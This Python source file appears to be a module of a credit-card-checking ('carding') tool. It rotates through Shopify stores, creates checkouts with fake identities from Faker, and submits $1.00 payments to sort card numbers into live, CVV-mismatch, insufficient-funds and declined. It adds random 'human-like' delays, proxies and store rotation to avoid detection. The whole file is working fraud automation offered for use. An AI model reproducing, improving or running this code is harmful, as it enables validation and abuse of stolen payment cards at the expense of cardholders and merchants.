"""
Enhanced Shopify Gateway with Success-Rate Based Store Rotation
Integrates stealth, circuit breaker, and smart store selection
"""

import os
import re
import json
import time
import random
from typing import Tuple, Optional, Dict, List
from dataclasses import dataclass, field
from faker import Faker

from gates.gateway_utils import (
    GatewaySession,
    enhanced_gateway,
    cache_token,
    get_cached_token,
    random_delay,
    CardStatus,
    format_result,
)
from tools.bin_lookup import get_card_info

fake = Faker()


@dataclass
class StoreStats:
    """Track success/failure rates for a store"""
    url: str
    total_checks: int = 0
    successes: int = 0
    failures: int = 0
    last_used: float = 0.0
    is_dead: bool = False
    
    @property
    def success_rate(self) -> float:
        if self.total_checks == 0:
            return 0.5  # Unknown stores get 50% assumed rate
        return self.successes / self.total_checks
    
    @property
    def weight(self) -> float:
        """Calculate selection weight based on success rate and recency"""
        if self.is_dead:
            return 0.0
        
        base_weight = self.success_rate
        
        # Boost stores not used recently
        time_since_use = time.time() - self.last_used
        if time_since_use > 300:  # 5 minutes
            base_weight *= 1.2
        
        return min(base_weight, 1.0)


class StoreRotator:
    """
    Manages Shopify store rotation based on success rates.
    Automatically deprioritizes failing stores.
    """
    
    def __init__(self):
        self._stores: Dict[str, StoreStats] = {}
        self._min_success_rate = 0.1  # Mark store dead below this
        self._min_checks_before_death = 5  # Min checks before marking dead
    
    def add_stores(self, urls: List[str]) -> None:
        """Add stores to the rotation pool"""
        for url in urls:
            if url not in self._stores:
                self._stores[url] = StoreStats(url=url)
    
    def get_best_store(self) -> Optional[str]:
        """Get the best store based on success rate and load balancing"""
        available = [s for s in self._stores.values() if not s.is_dead]
        
        if not available:
            # Reset all stores if all are dead
            for store in self._stores.values():
                store.is_dead = False
            available = list(self._stores.values())
        
        if not available:
            return None
        
        # Weighted random selection
        weights = [max(s.weight, 0.1) for s in available]
        total_weight = sum(weights)
        
        if total_weight == 0:
            return random.choice(available).url
        
        r = random.uniform(0, total_weight)
        cumulative = 0
        
        for store, weight in zip(available, weights):
            cumulative += weight
            if r <= cumulative:
                return store.url
        
        return available[-1].url
    
    def record_success(self, url: str) -> None:
        """Record a successful check for a store"""
        if url in self._stores:
            store = self._stores[url]
            store.total_checks += 1
            store.successes += 1
            store.last_used = time.time()
            store.is_dead = False
    
    def record_failure(self, url: str) -> None:
        """Record a failed check for a store"""
        if url in self._stores:
            store = self._stores[url]
            store.total_checks += 1
            store.failures += 1
            store.last_used = time.time()
            
            # Check if store should be marked dead
            if (store.total_checks >= self._min_checks_before_death and 
                store.success_rate < self._min_success_rate):
                store.is_dead = True
    
    def get_stats(self) -> Dict[str, Dict]:
        """Get statistics for all stores"""
        return {
            url: {
                "success_rate": f"{store.success_rate * 100:.1f}%",
                "total_checks": store.total_checks,
                "is_dead": store.is_dead,
            }
            for url, store in self._stores.items()
        }


# Global store rotator
_store_rotator = StoreRotator()

# Default Shopify stores
DEFAULT_STORES = [
    "https://checkout.shopify.com",
    # Add more known working stores here
]

# Initialize rotator
_store_rotator.add_stores(DEFAULT_STORES)


def add_shopify_stores(urls: List[str]) -> None:
    """Add stores to the rotation pool"""
    _store_rotator.add_stores(urls)


def get_shopify_stats() -> Dict[str, Dict]:
    """Get Shopify store statistics"""
    return _store_rotator.get_stats()


def _extract_checkout_token(store_url: str, session: GatewaySession) -> Optional[str]:
    """Extract checkout token from Shopify store"""
    cache_key = f"shopify_token_{store_url}"
    cached = get_cached_token(cache_key)
    if cached:
        return cached
    
    try:
        # Try to get a product page and extract checkout token
        resp = session.get(store_url, timeout=15)
        if resp.status_code != 200:
            return None
        
        # Look for checkout token patterns
        patterns = [
            r'"checkoutToken"\s*:\s*"([a-zA-Z0-9]+)"',
            r'checkout_token\s*=\s*["\']([a-zA-Z0-9]+)["\']',
            r'data-checkout-token="([a-zA-Z0-9]+)"',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, resp.text)
            if matches:
                token = matches[0]
                cache_token(cache_key, token, ttl=1800)  # 30 min cache
                return token
        
        return None
    except Exception:
        return None


@enhanced_gateway("shopify_enhanced")
def shopify_enhanced_check(
    card_num: str,
    card_mon: str,
    card_yer: str,
    card_cvc: str,
    proxy: Optional[str] = None,
    store_url: Optional[str] = None,
) -> Tuple[str, bool]:
    """
    Enhanced Shopify card check with smart store rotation.
    
    Args:
        card_num: Card number
        card_mon: Expiry month (MM)
        card_yer: Expiry year (YY or YYYY)
        card_cvc: CVV/CVC
        proxy: Optional proxy string
        store_url: Optional specific store to use (otherwise auto-rotates)
    
    Returns:
        (status_message, proxy_alive)
    """
    session = GatewaySession("shopify_enhanced", proxy=proxy)
    
    # Select store
    url = store_url or _store_rotator.get_best_store()
    if not url:
        return ("Error: No Shopify stores available", False)
    
    # Get BIN info
    bin_info = get_card_info(card_num)
    
    # Normalize year
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    try:
        # Human-like delay
        random_delay(0.5, 1.5)
        
        # Step 1: Get or create cart
        cart_url = f"{url}/cart.js"
        cart_resp = session.get(cart_url, timeout=15)
        
        if cart_resp.status_code != 200:
            _store_rotator.record_failure(url)
            return (f"❌ Store unavailable: {url}", False)
        
        # Step 2: Create checkout
        checkout_url = f"{url}/wallets/checkouts.json"
        
        checkout_data = {
            "checkout": {
                "email": fake.email(),
                "shipping_address": {
                    "first_name": fake.first_name(),
                    "last_name": fake.last_name(),
                    "address1": fake.street_address(),
                    "city": fake.city(),
                    "province": "California",
                    "country": "United States",
                    "zip": fake.zipcode(),
                },
            }
        }
        
        random_delay(0.3, 0.8)
        
        checkout_resp = session.post(
            checkout_url,
            json=checkout_data,
            headers={"Content-Type": "application/json"},
            timeout=20,
        )
        
        if checkout_resp.status_code not in [200, 201]:
            _store_rotator.record_failure(url)
            return ("❌ Checkout creation failed", True)
        
        checkout_json = checkout_resp.json()
        checkout_token = checkout_json.get("checkout", {}).get("token")
        
        if not checkout_token:
            _store_rotator.record_failure(url)
            return ("❌ No checkout token", True)
        
        # Step 3: Submit payment
        payment_url = f"{url}/wallets/checkouts/{checkout_token}/payments.json"
        
        payment_data = {
            "payment": {
                "amount": "1.00",
                "unique_token": f"{int(time.time())}{random.randint(1000, 9999)}",
                "payment_token": {
                    "payment_data": {
                        "number": card_num,
                        "month": card_mon,
                        "year": f"20{card_yer}",
                        "verification_value": card_cvc,
                        "name": f"{fake.first_name()} {fake.last_name()}",
                    },
                    "type": "credit_card",
                },
            }
        }
        
        random_delay(0.5, 1.0)
        
        payment_resp = session.post(
            payment_url,
            json=payment_data,
            headers={"Content-Type": "application/json"},
            timeout=25,
        )
        
        payment_json = payment_resp.json()
        
        # Parse response
        if payment_resp.status_code == 200:
            payment_info = payment_json.get("payment", {})
            transaction = payment_info.get("transaction", {})
            
            if transaction.get("status") == "success":
                _store_rotator.record_success(url)
                return (format_result(CardStatus.LIVE, card_num, bin_info), True)
            
            # Check for specific decline reasons
            error = payment_info.get("error_code", "") or transaction.get("message", "")
            error_lower = error.lower()
            
            if "cvv" in error_lower or "cvc" in error_lower or "security" in error_lower:
                _store_rotator.record_success(url)  # Store worked, card issue
                return (format_result(CardStatus.CVV_MISMATCH, card_num, bin_info), True)
            
            if "insufficient" in error_lower:
                _store_rotator.record_success(url)
                return (format_result(CardStatus.INSUFFICIENT, card_num, bin_info), True)
            
            if "expired" in error_lower:
                _store_rotator.record_success(url)
                return (format_result(CardStatus.EXPIRED, card_num, bin_info), True)
            
            if "3d" in error_lower or "secure" in error_lower:
                _store_rotator.record_success(url)
                return (format_result(CardStatus.THREE_DS, card_num, bin_info), True)
        
        # Check error in response
        error = payment_json.get("errors", {})
        if error:
            error_str = str(error).lower()
            
            if "card number" in error_str or "invalid" in error_str:
                _store_rotator.record_success(url)
                return (format_result(CardStatus.INVALID, card_num, bin_info), True)
        
        _store_rotator.record_success(url)
        return (format_result(CardStatus.DECLINED, card_num, bin_info), True)
        
    except Exception as e:
        _store_rotator.record_failure(url)
        return (f"Error: {str(e)[:40]}", False)
